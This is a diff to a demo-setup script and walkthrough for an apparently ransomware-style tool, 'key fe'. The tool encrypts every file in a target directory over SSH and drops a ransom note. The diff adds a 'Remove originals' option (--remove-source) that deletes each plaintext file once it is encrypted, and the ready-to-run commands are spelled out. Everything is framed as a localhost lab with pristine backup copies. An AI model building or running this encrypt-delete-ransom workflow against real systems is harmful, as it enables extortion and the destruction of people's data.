@@ -131,7 +131,10 @@ INSERT INTO credentials VALUES ('vpn','svc_vpn','a1b2c3d4e5f6');
 INSERT INTO credentials VALUES ('aws','admin','f6e5d4c3b2a1');
 EOF
 
-ok "Created $(find "$TARGET_DIR" -type f | wc -l) sample files + victims.db"
+# pristine copies for the recovery-proof diff (step 3 of the demo)
+cp -a "$TARGET_DIR" "$LAB_ROOT/golden"
+chmod 700 "$LAB_ROOT/golden"
+ok "Created $(find "$TARGET_DIR" -type f | wc -l) sample files (pristine copies in golden/)"
 
 # ---------- verify local SSH lab ----------
 SSH_PID_FILE="/tmp/ssh/sshd.pid"
@@ -155,6 +158,9 @@ Lab root: \`$LAB_ROOT\`
 ./setup_demo_env.sh --cleanup  # remove the lab entirely
 \`\`\`
 
+The sweep deletes the originals (Remove originals is checked). Rebuild restores
+everything, including the pristine copies in \`golden/\` used by the step-3 diff.
+
 ## 1. Start the control panel
 
 \`\`\`bash
@@ -177,16 +183,18 @@ python3 control_panel.py
 | Drop ransom note | [x] checked                    |
 | Note template    | \`press\`                        |
 | Remote note path | \`$LAB_ROOT/NOTE.txt\` |
+| Remove originals | [x] checked (--remove-source)  |
 
-Every file under \`target/\` becomes \`<name>.enc\` beside the original, then
-the dashboard cats the dropped note back from the remote host.
+Every file under \`target/\` becomes \`<name>.enc\` and the original is deleted
+right after its ciphertext is written, so \`ls $TARGET_DIR\` then shows only
+\`.enc\` files. The dashboard cats the dropped note back from the remote host.
 
 Shell equivalent:
 
 \`\`\`bash
 key fe -e --host 127.0.0.1 \\
     -i $TARGET_DIR -k hunter2 --timeout 30 --local-in \\
-    --drop-note press --note-out $LAB_ROOT/NOTE.txt
+    --drop-note press --note-out $LAB_ROOT/NOTE.txt --remove-source
 \`\`\`
 
 ## 3. Decrypt one file (recovery proof)
@@ -209,7 +217,7 @@ key fe -d --host 127.0.0.1 \\
     -i $TARGET_DIR/victims.db.enc -o $OUTPUT_DIR/victims.db \\
     -k hunter2 --timeout 30 --local-out
 
-diff $TARGET_DIR/victims.db $OUTPUT_DIR/victims.db   # identical => recovery works
+diff $LAB_ROOT/golden/victims.db $OUTPUT_DIR/victims.db   # identical => recovery works
 \`\`\`
 
 ## 4. Wrong password (fails clean)
@@ -243,9 +251,11 @@ box_row "$(dots --local-out)"         "[ ] unchecked" "$DIM"
 box_row "$(dots 'Drop ransom note')"  "[x] checked"   "$GREEN"
 box_row "$(dots 'Note template')"     "press"
 box_row "$(dots 'Remote note path')"  "$LAB_ROOT/NOTE.txt"
+box_row "$(dots 'Remove originals')"  "[x] checked"   "$GREEN"
 box_line "$DIM" ""
 box_line "$DIM" "Sweeps ignore the output path: each file is encrypted to"
-box_line "$DIM" "<name>.enc right beside the source file."
+box_line "$DIM" "<name>.enc right beside the source file; with"
+box_line "$DIM" "Remove originals checked the source is then deleted."
 rule_bot
 
 echo
@@ -261,7 +271,7 @@ box_row "$(dots Direction)"           "decrypt local -> remote"
 box_row "$(dots --local-in)"          "[ ] unchecked" "$DIM"
 box_row "$(dots --local-out)"         "[x] checked"   "$GREEN"
 box_line "$DIM" ""
-box_line "$DIM" "Then verify: diff $TARGET_DIR/victims.db"
+box_line "$DIM" "Then verify: diff $LAB_ROOT/golden/victims.db"
 box_line "$DIM" "             $OUTPUT_DIR/victims.db"
 rule_bot
 
@@ -269,7 +279,7 @@ echo
 info "Shell equivalents:"
 printf '  key fe -e --host 127.0.0.1 \\\n'
 printf '      -i %s -k hunter2 --timeout 30 --local-in \\\n' "$TARGET_DIR"
-printf '      --drop-note press --note-out %s/NOTE.txt\n' "$LAB_ROOT"
+printf '      --drop-note press --note-out %s/NOTE.txt --remove-source\n' "$LAB_ROOT"
 printf '  key fe -d --host 127.0.0.1 \\\n'
 printf '      -i %s/victims.db.enc -o %s/victims.db \\\n' "$TARGET_DIR" "$OUTPUT_DIR"
 printf '      -k hunter2 --timeout 30 --local-out\n'
